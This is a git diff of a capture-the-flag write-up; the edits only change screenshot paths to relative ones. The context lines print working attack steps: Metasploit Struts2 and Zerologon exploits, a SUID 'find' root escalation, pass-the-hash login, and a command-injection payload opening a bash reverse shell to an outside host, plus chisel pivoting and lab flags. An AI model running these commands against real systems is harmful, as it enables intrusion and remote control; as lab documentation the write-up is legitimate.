@@ -58,7 +58,7 @@ msfconsole -qx "use exploit/multi/http/struts2_content_type_ognl; set RHOSTS 10.
 
 As expected, we obtained a shell.
 
-![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/linux_task_2.png)
+![](screenshots/linux_task_2.png)
 
 Our shell is a low-privileged `tomcat` user shell though. A good SUID binary search might show us the way to elevate to root.
 
@@ -68,7 +68,7 @@ Out of the results obtained, `/usr/bin/find` was the most interesting.
 
  So [GTFObins](https://gtfobins.github.io/gtfobins/find/) hinted us on an interesting command that could proclaim us **root** ! `/usr/bin/find . -exec /bin/bash -p \;`
 
-![linux_task_3](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/linux_task_3.png)
+![linux_task_3](screenshots/linux_task_3.png)
 
 And it worked, just like magic... **`flag: cybered{ec78de74746e616cc5b2ef86999db634}`**
 
@@ -90,7 +90,7 @@ An attempt to dump the NTLM information of the target was made using an impacket
 DumpNTLMInfo.py 10.10.0.42
 ```
 
-![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/windows_task_1.png)
+![](screenshots/windows_task_1.png)
 
 The **Null Session** flag set to **True** means that null sessions are allowed. This confirms that the machine is   a Domain Controller `DC1`  running a version of Windows vulnerable to **Zerologon(CVE-2020-1472)** if not patched. This vulnerability allows unauthenticated privilege escalation.
 
@@ -104,7 +104,7 @@ Metasploit contains the *zerologon* exploit, and since we have noting to lose, l
 msfconsole -x "use auxiliary/admin/dcerpc/cve_2020_1472_zerologon; set RHOSTS 10.10.0.42; set NBNAME DC1; run"
 ```
 
-![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/windows_task_2.png) 
+![](screenshots/windows_task_2.png) 
 
 Magic Magic, **it worked** ! 
 
@@ -130,7 +130,7 @@ Then used the hash to login into the *Administrator*'s account using `impacket-w
 ➜  PHC wmiexec.py SANDBOX/Administrator@10.10.0.42 -hashes aad3b435b51404eeaad3b435b51404ee:04e3495f5762e65f344c6862a8bb0fe8
 ```
 
-![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/windows_task_3.png)
+![](screenshots/windows_task_3.png)
 
 The zipped and password-protected flag was found in the Desktop as announced in the task description. To crack the password, we downloaded the `flag.zip` to our local machine using the command `lget flag.zip`.
 
@@ -142,7 +142,7 @@ We then create a super-cozy script that would use zip2john and hashcat to crack 
 
 After a quick failure, we remembered that we needed to identify the type of hash and code  dumped by `zip2john` in `hash.txt` using the command `hashcat --identify hash.txt` which turned out to be **17210** for **pkzip** hashes.
 
-![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/windows_task_4.png)
+![](screenshots/windows_task_4.png)
 
 **NB** The password (*abc123*) wasn't present in the [realyBest](https://github.com/empty-jack/YAWR/blob/master/brute/passwords/realyBest.txt) wordlist recommended by the task. So  `Rockyou.txt` **rocked again !!** `flag: cybered{d2d399ada068c5619681c395b3a3a265} `
 
@@ -162,7 +162,7 @@ We found using nmap the ***book search*** service running on port 80 and we visi
  1984; bash -c 'bash -i >& /dev/tcp/62.84.113.48/4444 0>&1'
  ```
 
-![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/web_task_1.png)
+![](screenshots/web_task_1.png)
 
 At the same time, our netcat listener caught a shell. `nc -nlvp 4444`.
 
@@ -211,11 +211,11 @@ We then used *chisel* to pivot and be able to access the internal network IP `19
 ./chisel client 62.84.113.48:8989 R:8080:192.168.29.56:80 
 ```
 
-![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/web_task_2.png)
+![](screenshots/web_task_2.png)
 
 Now tat we could access the internal service, we created and account, proxied the session through burp and discovered some interesting javascript in the page source of a logged in user.
 
-![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/web_task_4_1.png)
+![](screenshots/web_task_4_1.png)
 
 What this script does is that it attempts to make a payment with a given user ID. Our *user_id* is 3, and we are broke,  but that we can change. So we crafted a POST request that matched the exposed script. Only that, we tried to check if the *user_id=1* had some **cash** left in his account :)
 
@@ -241,7 +241,7 @@ Priority: u=0, i
 
 **Bingo !** - we were rewarded with a **`flag: cybered{4738f60ac8cf6c5da65e51ea1e62b530}`**
 
-![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/web_task_4.png)
+![](screenshots/web_task_4.png)
 
 # Conclusion
 
